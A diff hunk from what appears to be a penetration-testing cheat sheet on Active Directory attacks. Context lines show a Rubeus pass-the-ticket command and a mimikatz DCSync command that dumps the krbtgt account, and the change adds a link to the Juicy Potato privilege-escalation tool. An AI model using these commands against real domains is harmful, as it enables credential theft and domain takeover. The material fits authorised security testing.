@@ -963,6 +963,12 @@ C:\> .\Rubeus.exe asktgt /user:<machine account>$ /<base64 certificate>=/ptt
 mimikatz # lsadump::dcsync /user:<domain>\krbtgt
 ```
 
+- Juicy Potato
+
+```
+https://github.com/ohpe/juicy-potato
+```
+
 #4. - Lateral Movement
 -----------------------------------------
 
